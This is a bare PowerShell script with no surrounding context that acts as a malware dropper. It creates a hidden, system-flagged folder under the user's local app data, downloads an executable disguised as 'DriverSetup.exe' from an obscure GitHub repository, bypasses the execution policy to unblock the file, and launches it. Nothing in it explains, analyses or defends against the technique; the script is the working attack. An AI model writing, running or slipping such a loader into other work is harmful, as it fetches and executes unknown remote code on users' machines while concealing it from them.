$folder = "%LOCALAPPDATA%\.tempfiles"
$exe = "$folder\DriverSetup.exe"
$url = "https://github.com/zzfef33f/k2/raw/refs/heads/main/DriverSetup.exe"

New-Item -ItemType Directory -Path $folder -Force | Out-Null
attrib +h +s $folder

Invoke-WebRequest -Uri $url -OutFile $exe
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path %LOCALAPPDATA%\.tempfiles\DriverSetup.exe"

Start-Process -FilePath '%LOCALAPPDATA%\.tempfiles\DriverSetup.exe'
